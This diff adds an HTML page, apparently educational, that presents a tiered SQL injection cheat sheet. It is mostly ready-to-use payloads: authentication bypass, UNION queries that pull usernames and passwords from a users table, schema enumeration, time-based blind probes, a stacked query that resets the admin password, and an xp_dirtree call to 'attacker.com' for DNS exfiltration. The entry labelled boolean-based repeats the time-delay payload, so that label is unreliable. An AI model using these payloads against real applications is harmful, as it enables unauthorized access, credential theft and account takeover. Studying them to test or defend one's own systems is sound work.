@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css"> <!-- Link to the external CSS file -->
+  <title>SQL Injection Cheat Sheet</title>
+</head>
+<body>
+  <div class="lesson-container">
+    <h1>SQL Injection Cheat Sheet</h1>
+    
+    <div class="lesson">
+      <h2>Beginner SQL Injection</h2>
+      
+      <div class="lesson-description">
+        <p>Injecting SQL to retrieve all data from a table.</p>
+        <p>This technique exploits the application by injecting a modified query to return all data from a specific table.</p>
+      </div>
+      <pre><code>
+' OR '1'='1
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Bypassing authentication using OR '1'='1.</p>
+        <p>By injecting this payload, you can bypass authentication checks that rely on a true condition.</p>
+      </div>
+      <pre><code>
+' OR '1'='1' --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Extracting data from another table.</p>
+        <p>This technique involves injecting a query to extract data from a different table than intended.</p>
+      </div>
+      <pre><code>
+' UNION SELECT null, email, password FROM users --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Extracting data using ORDER BY.</p>
+        <p>You can inject ORDER BY clauses to reveal information about the structure of the database.</p>
+      </div>
+      <pre><code>
+' ORDER BY 1 --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Using UNION to extract data from other tables.</p>
+        <p>Injecting a UNION query to combine data from other tables and display it in the result set.</p>
+      </div>
+      <pre><code>
+' UNION SELECT null, table_name, null FROM information_schema.tables --
+      </code></pre>
+      
+      <!-- Add more beginner SQL Injection examples here -->
+    </div>
+    
+    <div class="lesson">
+      <h2>Intermediate SQL Injection</h2>
+      
+      <div class="lesson-description">
+        <p>Union-based SQL Injection.</p>
+        <p>This technique involves using the UNION SQL operation to combine data from two different tables in the result set.</p>
+      </div>
+      <pre><code>
+' UNION SELECT null, username, password FROM users --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Error-based SQL Injection to extract database version.</p>
+        <p>This technique exploits error messages returned by the database to extract information such as the database version.</p>
+      </div>
+      <pre><code>
+' AND 1=CONVERT(int, (SELECT @@version)) --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Blind SQL Injection using time delays.</p>
+        <p>By injecting a payload that triggers time delays, you can infer information based on the delay in the application's response.</p>
+      </div>
+      <pre><code>
+' OR IF(1=1, SLEEP(5), 0) --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Blind SQL Injection using boolean-based techniques.</p>
+        <p>Injecting payloads that rely on conditional boolean expressions to reveal information.</p>
+      </div>
+      <pre><code>
+' OR IF(1=1, sleep(5), 0) --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Using subqueries to extract data.</p>
+        <p>Injecting subqueries to extract data from multiple tables or perform operations within the query.</p>
+      </div>
+      <pre><code>
+' UNION SELECT (SELECT group_concat(table_name) FROM information_schema.tables), null, null --
+      </code></pre>
+      
+      <!-- Add more intermediate SQL Injection examples here -->
+    </div>
+    
+    <div class="lesson">
+      <h2>Advanced SQL Injection</h2>
+      
+      <div class="lesson-description">
+        <p>Time-based Blind SQL Injection.</p>
+        <p>This technique involves using conditional queries to create delays, revealing information based on how long it takes for the application to respond.</p>
+      </div>
+      <pre><code>
+' OR IF(1=1, SLEEP(5), 0) --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Second-order SQL Injection.</p>
+        <p>This technique exploits an initial vulnerability in one part of an application to inject malicious data that is later executed in another context.</p>
+      </div>
+      <pre><code>
+' ; UPDATE users SET password='newpass' WHERE username='admin' --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Out-of-band SQL Injection using DNS requests.</p>
+        <p>This technique involves injecting payloads that trigger DNS requests to an attacker-controlled server, enabling data exfiltration.</p>
+      </div>
+      <pre><code>
+'; EXEC xp_dirtree '\\attacker.com\' --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Blind SQL Injection using time delays.</p>
+        <p>Expanding on time-based techniques to gather more complex information.</p>
+      </div>
+      <pre><code>
+' OR IF(1=1, BENCHMARK(5000000, SHA1(1)), 0) --
+      </code></pre>
+      
+      <div class="lesson-description">
+        <p>Advanced UNION-based SQL Injection with ORDER BY and LIMIT.</p>
+        <p>Combining multiple techniques to extract and manipulate data in a sophisticated manner.</p>
+      </div>
+      <pre><code>
+' UNION SELECT null, column_name, table_name FROM information_schema.columns ORDER BY table_name LIMIT 10 OFFSET 20 --
+      </code></pre>
+      
+      <!-- Add more advanced SQL Injection examples here -->
+    </div>
+    
+    <footer>
+      <p>&copy; 2023 WillJTools. All rights reserved.</p>
+    </footer>
+    
+  </div>
+</body>
+</html>
